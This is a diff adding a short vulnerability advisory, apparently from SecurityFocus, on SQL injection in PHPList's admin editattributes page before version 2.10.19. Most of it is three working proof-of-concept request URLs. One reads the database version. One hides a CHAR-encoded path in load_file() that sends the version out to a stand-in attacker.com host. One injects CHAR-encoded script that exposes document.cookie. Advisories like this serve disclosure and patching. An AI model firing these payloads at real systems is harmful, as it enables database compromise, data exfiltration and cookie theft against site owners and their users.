@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/54912/info
+
+PHPList is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Versions prior to PHPList 2.10.19 are vulnerable. 
+
+http://www.example.com/admin/?page=editattributes&id=1&delete=1 union select version() --
+
+http://www.example.com/admin/?page=editattributes&id=1&delete=1 union select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))) --
+
+http://www.example.com/admin/?page=editattributes&id=1&delete=1 union select char(60,115,99,114,105,112,116,62,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,60,47,115,99,114,105,112,116,62) -- 
